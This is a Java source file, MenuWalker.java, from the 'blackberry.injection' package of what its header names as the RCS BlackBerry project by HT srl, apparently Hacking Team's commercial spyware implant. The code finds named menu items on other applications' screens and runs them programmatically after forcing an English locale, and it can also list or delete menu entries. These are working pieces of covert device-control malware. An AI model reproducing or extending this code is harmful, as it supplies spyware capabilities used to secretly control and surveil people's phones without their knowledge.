//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.injection
 * File         : MenuWalker.java
 * Created      : 2-lug-2010
 * *************************************************/
package blackberry.injection;


import java.util.Vector;

import net.rim.device.api.i18n.Locale;
import net.rim.device.api.system.Application;
import net.rim.device.api.ui.MenuItem;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.component.Menu;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

//import net.rim.device.api.ui.menu.SubMenu;

public class MenuWalker {

    //#ifdef DEBUG
    private static Debug debug = new Debug("MenuWalker", DebugLevel.VERBOSE);
    //#endif

    static Locale prev;
    static Locale locale;

    public static boolean walk(String[] menus, Screen screen, boolean simple) {
        //#ifdef DEBUGWALK
        final Debug debug = new Debug("walk", DebugLevel.VERBOSE);
        debug.trace("walk, active screen:" + UiApplication.getUiApplication().getActiveScreen() + " Screen: " + screen);

        for (int j = 0; j < menus.length; j++) {
            String menuItemText = menus[j];
            debug.trace("walk: " + menuItemText + " screen: " + screen);
        }
        //#endif

        boolean ret = false;

        setLocaleBegin();

        final Menu menu = screen.getMenu(0);
        for (int i = 0, cnt = menu.getSize(); i < cnt && !ret; i++) {
            final MenuItem item = menu.getItem(i);

            if (item == null) {
                //#ifdef DEBUGWALK
                debug.error("null item: " + i);
                //#endif
                continue;
            }

            final String content = item.toString();

            if (content == null) {
                //#ifdef DEBUGWALK
                debug.error("null content: " + i);
                //#endif
                continue;
            }

            //#ifdef DEBUGWALK
            debug.trace(content);
            //#endif

            for (int j = 0; j < menus.length; j++) {
                String menuItemText = menus[j];

                if (content.equalsIgnoreCase(menuItemText)) {
                    if (simple) {
                        //#ifdef DEBUGWALK
                        debug.info("running simple: " + content);
                        //#endif
                        item.run();
                        ret = true;
                        break;
                    } else {
                        //#ifdef DEBUGWALK
                        debug.trace("running invoke: " + content);
                        //#endif

                        Application app = screen.getApplication();
                        if (app == null) {
                            //#ifdef DEBUGWALK
                            debug.trace("null app");
                            //#endif
                            app = Application.getApplication();
                        }
                        app.invokeLater(new Runnable() {
                            public void run() {
                                //#ifdef DEBUGWALK
                                debug.trace("into run");
                                //#endif
                                item.run();
                                //#ifdef DEBUGWALK
                                debug.trace("  menuwalk local active screen: "
                                        + UiApplication.getUiApplication()
                                                .getActiveScreen());
                                //#endif
                            }
                        });

                        break;
                    }
                }
            }
        }

        setLocaleEnd();

        return ret;
    }

    public static boolean walk(String menuItemText, Screen screen, boolean simple) {
        final Debug debug = new Debug("walk", DebugLevel.INFORMATION);

        debug.trace("walk: " + menuItemText + " screen: " + screen);
        boolean ret = false;

        setLocaleBegin();

        final Menu menu = screen.getMenu(0);
        for (int i = 0, cnt = menu.getSize(); i < cnt && !ret; i++) {
            final MenuItem item = menu.getItem(i);

            if (item == null) {
                debug.error("null item: " + i);
                continue;
            }

            final String content = item.toString();

            if (content == null) {
                debug.error("null content: " + i);
                continue;
            }

            debug.trace(content);

            if (content.equalsIgnoreCase(menuItemText)) {
                if (simple) {
                    debug.info("running simple: " + content);
                    item.run();
                    ret = true;
                    break;
                } else {

                    debug.trace("running invoke: " + content);

                    Application app = screen.getApplication();
                    if (app == null) {
                        debug.trace("null app");
                        app = Application.getApplication();
                    }
                    app.invokeLater(new Runnable() {
                        public void run() {
                            debug.trace("into run");
                            item.run();

                            debug.trace("  menuwalk local active screen: "
                                    + UiApplication.getUiApplication()
                                            .getActiveScreen());
                        }
                    });

                    break;
                }
            }
        }

        setLocaleEnd();

        return ret;
    }

    static Vector logMenus(Screen screen) {
        return getMenus(null, screen);
    }

    public static void deleteMenu(Screen screen, String deleteName) {
        Debug debug = new Debug("getMenus", DebugLevel.VERBOSE);
        
        debug.trace("walk, active screen:"
                + UiApplication.getUiApplication().getActiveScreen()
                + " Screen: " + screen);
        Vector vector = new Vector();

        setLocaleBegin();

        Menu menu = screen.getMenu(0);
        int deletePos = -1;
        for (int i = 0, cnt = menu.getSize(); i < cnt; i++) {
            String menuname = menu.getItem(i).toString();

            if (menuname.startsWith(deleteName)) {
                debug.info("menu: " + menuname);
                deletePos=i;
                vector.addElement(menuname);
            }
        }
        
        if(deletePos>=0){
            synchronized(UiApplication.getUiApplication().getEventLock()){
                //#ifdef DEBUG
                debug.trace("deleteMenu: deleting pos: " + deletePos);
                //#endif
                menu.deleteItem(deletePos);
            }
        }

        setLocaleEnd();

    }

    static Vector getMenus(String starting, Screen screen) {
        Debug debug = new Debug("getMenus", DebugLevel.VERBOSE);
       
        debug.trace("walk, active screen:"
                + UiApplication.getUiApplication().getActiveScreen()
                + " Screen: " + screen);
        Vector vector = new Vector();

        setLocaleBegin();

        Menu menu = screen.getMenu(0);

        for (int i = 0, cnt = menu.getSize(); i < cnt; i++) {
            String menuname = menu.getItem(i).toString();

            //debug.trace(menuname);
            if (starting == null || menuname.startsWith(starting)) {
                debug.info("menu: " + menuname);
                vector.addElement(menuname);
            }
        }

        setLocaleEnd();

        return vector;
    }

    /**
     * Sets the locale end.
     */
    public static void setLocaleEnd() {
        //#ifdef DEBUG
        // debug.trace("setLocaleEnd");
        //#endif
        Locale.setDefault(prev);
    }

    /**
     * Sets the locale start.
     * 
     * @return the locale
     */
    public static Locale setLocaleBegin() {
        //#ifdef DEBUG
        // debug.trace("setLocaleStart");
        //#endif
        prev = Locale.getDefault();
        final Locale locale = Locale.get(Locale.LOCALE_en);
        Locale.setDefault(locale);
        return locale;
    }

}
